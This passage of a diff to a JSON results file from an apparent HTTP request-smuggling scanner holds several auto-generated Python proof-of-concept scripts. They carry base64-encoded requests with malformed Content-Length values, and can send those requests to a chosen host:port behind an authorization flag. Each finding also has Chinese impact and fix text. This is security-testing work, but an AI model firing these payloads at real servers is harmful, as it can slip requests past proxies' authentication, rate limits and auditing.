-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 b8f75cf9，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_b8f75cf9.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_b8f75cf9.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'b8f75cf9'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogKzMNCg0KYWJj')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 b8f75cf9，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_b8f75cf9.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_b8f75cf9.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'b8f75cf9'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogKzMNCg0KYWJj')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_b8f75cf9.py"
     },
     {
@@ -465,13 +675,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 60,
       "sample_len": 43,
@@ -484,7 +709,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 276c3a0e，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_276c3a0e.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_276c3a0e.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '276c3a0e'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogYWJjDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 276c3a0e，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_276c3a0e.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_276c3a0e.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = '276c3a0e'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogYWJjDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_276c3a0e.py"
     },
     {
@@ -496,13 +721,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 81,
       "sample_len": 43,
@@ -515,7 +755,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 fc4c74fb，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_fc4c74fb.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_fc4c74fb.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = 'fc4c74fb'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMHgzDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == EXPECT\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n            if not ok:\n                print(\"说明        期望值来自生成时的实现；不一致说明复现条件已变，\")\n                print(\"            请重新跑一次 scan 生成新的 PoC，而不是改期望值。\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n        print(\"提示        走私的效果要看**下一条请求**，单次发送看不到；\"\n              \"请在后端日志或探针视角里确认被夹带的字节。\")\n    return 0\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 fc4c74fb，场景 desync，领域 http1-framing。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_fc4c74fb.py                      # 离线：算清量化指标（默认，不联网）\n    python poc_fc4c74fb.py --send HOST:PORT --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference\nfrom ced.orchestrate.chain import chain_evidence\n\nCASE_ID = 'fc4c74fb'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMHgzDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef measure():\n    \"\"\"按两侧的策略算出量化指标。算不出来返回 None。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = measure()\n    ok = got is not None\n    if got is None:\n        print(\"量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok = got == tuple(EXPECT)\n            print(f\"断言        {'PASS' if ok else 'FAIL'}（期望 {EXPECT}）\")\n\n    if args.send:\n        if not args.i_am_authorized:\n            print(\"拒绝发送：--send 需要同时给出 --i-am-authorized\"\n                  \"（只对自有或已授权目标使用）。\")\n            return 2\n        host, _, port = args.send.rpartition(\":\")\n        with socket.create_connection((host or \"127.0.0.1\", int(port)), timeout=10) as sock:\n            sock.sendall(PAYLOAD)\n            sock.shutdown(socket.SHUT_WR)\n            response = b\"\"\n            while True:\n                chunk = sock.recv(65536)\n                if not chunk:\n                    break\n                response += chunk\n        print(f\"已发送      {args.send}，收到 {len(response)} 字节响应\")\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
       "file_name": "poc_fc4c74fb.py"
     },
     {
@@ -527,13 +767,28 @@
       "left": "ref-cl-first",
       "right": "ref-loose-request-line",
       "axis": "request_line",
+      "domain": "http1-framing",
       "impact": "前置与后端对『这条请求到哪里结束』判断不同：前置转发的字节里，后端只消费了一部分，剩下的成为后端眼中**下一条请求**的开头。于是攻击者可以在前置完全看不见的情况下，向后端注入一条自选请求 —— 前置的鉴权、限流、审计对这条被夹带的请求全部失效。",
       "fix": "对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式",
       "evidence": "把请求行规范化成 `POST / HTTP/1.1` —— 分歧消失，说明它由攻击者可直接发送的部分承载",
       "chain_desc": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
-      "forwarded": 0,
-      "back_consumed": 0,
-      "smuggled_len": 0,
+      "quant": {
+        "label": "被夹带字节数",
+        "describe": "若 **ref-cl-first → ref-loose-request-line** 串联：前置未转发任何字节（按自身策略拒绝）→ 不产生夹带；但『一侧拒绝、一侧接受』本身构成绕过/可用性面",
+        "values": {
+          "front": "ref-cl-first",
+          "back": "ref-loose-request-line",
+          "forwarded": "0",
+          "back_consumed": "0",
+          "smuggled": "0"
+        },
+        "numbers": [
+          0,
+          0,
+          0
+        ],
+        "verified": true
+      },
       "verified": true,
       "original_len": 77,
       "sample_len": 43,
@@ -546,7 +801,7 @@
         "紧随其后的下一条请求会被拼接在那 0 字节之后，被夹带的字节成为后端眼中另一条请求的开头",
         "修复：对 CL 与 TE 并存、非规范 CL、冲突 CL、TE 终编码非 chunked 的请求一律 400 拒绝；上游必须在转发前完成定帧并重写为规范形式"
       ],
-      "script": "#!/usr/bin/env python3\n\"\"\"请求走私（HTTP/1.1 消息边界分歧）\n\n由 CED 自动生成 —— 用例 63b954dd，场景 desync。\n零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。\n\n    python poc_63b954dd.py                      # 离线：算清字节归属（默认，不联网）\n    python poc_63b954dd.py --send 127.0.0.1:8080 --i-am-authorized\n                                            # 真的把最小复现样本发出去（仅限已授权目标）\n\n合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。\n\"\"\"\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport socket\nimport sys\nfrom pathlib import Path\n\n\ndef _find_root() -> Path:\n    \"\"\"往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。\"\"\"\n    here = Path(__file__).resolve()\n    for parent in here.parents:\n        if (parent / \"ced\" / \"__init__.py\").is_file():\n            return parent\n    return here.parent\n\n\nROOT = _find_root()\nif str(ROOT) not in sys.path:\n    sys.path.insert(0, str(ROOT))\n\nfrom ced.impls import reference                      # noqa: E402\nfrom ced.orchestrate.chain import chain_evidence     # noqa: E402\n\nCASE_ID = '63b954dd'\nFRONT = 'ref-cl-first'\nBACK = 'ref-loose-request-line'\nPAYLOAD = base64.b64decode('cG9zdCAvIEhUVFAvMS4xDQpDb250ZW50LUxlbmd0aDogMHgzDQoNCmFiYw==')\nEXPECT = (0, 0, 0)\n\n\ndef accounting() -> tuple[int, int, int] | None:\n    \"\"\"用两侧的分帧策略算出：前置转发多少 / 后端消费多少 / 夹带多少。\"\"\"\n    try:\n        front_policy = reference.policy_of(FRONT)\n        back_policy = reference.policy_of(BACK)\n    except KeyError:\n        return None\n    ev = chain_evidence(PAYLOAD, front_policy, back_policy, FRONT, BACK)\n    return ev.forwarded, ev.back_consumed, ev.smuggled_len\n\n\ndef main() -> int:\n    ap = argparse.ArgumentParser(description=\"CED 生成的复现脚本\")\n    ap.add_argument(\"--send\", metavar=\"HOST:PORT\",\n                    help=\"把最小复现样本真的发到这个地址（前置入口）\")\n    ap.add_argument(\"--i-am-authorized\", action=\"store_true\",\n                    help=\"确认对 --send 的目标已获授权；缺此项则拒绝发送\")\n    args = ap.parse_args()\n\n    print(f\"用例        {CASE_ID}\")\n    print(f\"链路        {FRONT} → {BACK}\")\n    print(f\"样本长度    {len(PAYLOAD)} 字节\")\n\n    got = accounting()\n    if got is None:\n        print(\"字节归属    无法量化（两侧含非本地实现）—— 请在真实拓扑上复现\")\n    else:\n        forwarded, consumed, smuggled = got\n        print(f\"前置转发    {forwarded} 字节\")\n        print(f\"后端消费    {consumed} 字节\")\n        print(f\"被夹带      {smuggled} 字节\")\n        if EXPECT[0] is not None:\n            ok 